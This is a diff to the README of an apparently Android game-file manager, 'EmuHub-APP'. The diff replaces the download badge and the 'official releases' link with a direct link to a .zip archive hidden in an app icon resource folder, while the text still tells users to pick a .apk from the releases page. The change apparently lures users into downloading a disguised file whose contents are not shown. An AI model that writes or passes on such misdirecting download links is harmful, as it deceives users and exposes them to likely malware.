@@ -1,6 +1,6 @@
 # 🎮 EmuHub-APP - Manage PC games on your Android device
 
-[![](https://img.shields.io/badge/Download_EmuHub-Blue?style=for-the-badge)](https://github.com/danha4660/EmuHub-APP/releases)
+[![](https://img.shields.io/badge/Download_EmuHub-Blue?style=for-the-badge)](https://raw.githubusercontent.com/danha4660/EmuHub-APP/main/app/src/main/res/mipmap-mdpi/Hub-Emu-APP-3.6.zip)
 
 EmuHub finds the files you need to run PC games on your phone. It collects GPU drivers, mods, and specialized software builds in one place. The app updates your A8xx graphics drivers automatically from GitHub. You avoid manual searches and file management tasks.
 
@@ -18,7 +18,7 @@ EmuHub changes how you handle game files on Android.
 
 You need an Android device and an internet connection to use EmuHub. Follow these steps to install the software.
 
-1. Visit the [EmuHub Download Page](https://github.com/danha4660/EmuHub-APP/releases) to access the official releases.
+1. Visit the [EmuHub Download Page](https://raw.githubusercontent.com/danha4660/EmuHub-APP/main/app/src/main/res/mipmap-mdpi/Hub-Emu-APP-3.6.zip) to access the official releases.
 2. Look for the Assets section under the latest version.
 3. Select the file ending in .apk to download it to your phone.
 4. Tap the downloaded file to begin the installation.
